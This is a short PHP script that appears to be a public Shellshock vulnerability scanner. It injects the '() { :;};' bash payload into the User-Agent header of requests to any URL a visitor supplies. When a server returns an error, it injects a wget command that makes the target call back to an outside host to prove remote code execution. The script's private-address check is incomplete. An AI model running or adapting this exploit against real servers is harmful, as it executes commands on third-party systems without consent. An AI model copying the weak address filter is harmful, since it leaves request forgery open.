<?php
error_reporting(0);

$url = $_GET['url'];

if(!$url) 
{
    echo "You need to enter a URL";
	exit();
}
//check for proper URL
if(!preg_match("/\b(?:(?:https?):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i", $url))
{
	echo "URL must start with HTTP or HTTPS";
	exit();
}
//check for private URL
if(preg_match("/\b((?:https?):\/\/)(127.0.0.1|10.\d{1,3}.\d{1,3}.\d{1,3}|192.168.\d{1,3}.\d{1,3}|localhost)/i", $url))
{
	echo "Sorry, no Internal IP's";
	exit();
}

//remove the lines below if you want your scanner to allow scanning gov sites

$host = parse_url($url);
$host = $host['host'];
// stripping off sub-domain
preg_match('/[^.]+\.[^.]+$/', $host, $matches);
$l2 = $matches[0];
//check for gov sites
if(preg_match("/(gov)/i", $l2))
{
	echo "Yeah no thanks, a .gov site, really?!";
	exit();
}

if(preg_match("/(mil)/i", $l2))
{
	echo "A .mil site?! Do you want the NSA at your door?";
	exit();
}

$header = stream_context_create(
    array(
	'http' => array(
            'method'  => 'GET',
            'header'  => 'None'
        )
    )
);

//part of check2.php

$header = stream_context_create(
    array(
        'http' => array(
            'method'  => 'GET',
            'header'  => 'User-Agent: () { :;};echo "4141nothing4141";',
            'timeout' => 8
        )
    )
);

$req = file_get_contents($url, false, $header);

if(preg_match("/(200|201|202|404|403|301|302|307|308)/", $http_response_header[0]))
{ echo "We received the correct response, Server doesn't appear vulnerable." ;}

else if(preg_match("/500/", $http_response_header[0]))
{ 
	echo "Server appears vulnerable, running another test";

	//generate token
	$token = md5(uniqid(rand(), true));
	$header = 'User-Agent: () { :;};wget https://www.dr4cun0.com/shellshock/callme.php?id=' . $token; 
	$x = stream_context_create(
    	array(
		'http' => array(
        	    'method'  => 'GET',
        	    'header'  => $header
				)
			)
		);

	$req = file_get_contents($url, false, $x);


	//token check
	$url = 'https://www.dr4cun0.com/shellshock/id.log';

	$header = stream_context_create(
	array(
		'http' => array(
          	  'method'  => 'GET',
          	  'header'  => 'none'
		  	  )
		    )
		);

	$req = file_get_contents($url, false, $header);
	//output
	if(preg_match("/$token/",$req))
	{
		echo 'Server appears to be vulnerable!';
	}
}
else
{ 
	echo "Connection Error.";
}

?>